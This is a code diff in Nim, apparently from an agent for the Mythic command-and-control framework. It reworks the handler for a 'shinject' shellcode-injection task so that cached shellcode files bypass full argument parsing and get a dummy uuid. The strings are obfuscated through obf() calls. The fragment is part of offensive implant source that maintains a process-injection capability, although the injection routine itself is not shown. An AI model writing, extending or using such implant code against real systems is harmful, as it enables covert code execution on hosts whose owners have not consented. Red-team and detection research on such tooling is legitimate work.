@@ -35,9 +35,7 @@ proc shinject*(taskId: string, params: JsonNode): JsonNode =
     }
   else:
     try:
-      let args = to(params, ShinjectArgs)
-      
-      # Check if using cached file
+      # Check if using cached file first (no uuid needed)
       if params.hasKey(obf("cached")):
         let cachedName = params[obf("cached")].getStr()
         let cachedData = getCachedFile(cachedName)
@@ -48,8 +46,15 @@ proc shinject*(taskId: string, params: JsonNode): JsonNode =
             obf("status"): "error",
             obf("user_output"): obf("File not found in cache. Use register_file first: ") & cachedName
           }
-        var fileData: seq[byte] = @[]
-        return processShinjectChunk(taskId, params, encode(cast[string](cachedData)), 1, 1, fileData)
+        # Build params with dummy uuid for downstream parsing
+        var cachedParams = copy(params)
+        if not cachedParams.hasKey(obf("uuid")):
+          cachedParams[obf("uuid")] = %""
+        var fileData = cachedData
+        return processShinjectChunk(taskId, cachedParams, "", 1, 1, fileData)
+      
+      # Non-cached: parse full args (uuid required)
+      let args = to(params, ShinjectArgs)
       
       # Step 1: Request the shellcode file from Mythic
       return %*{
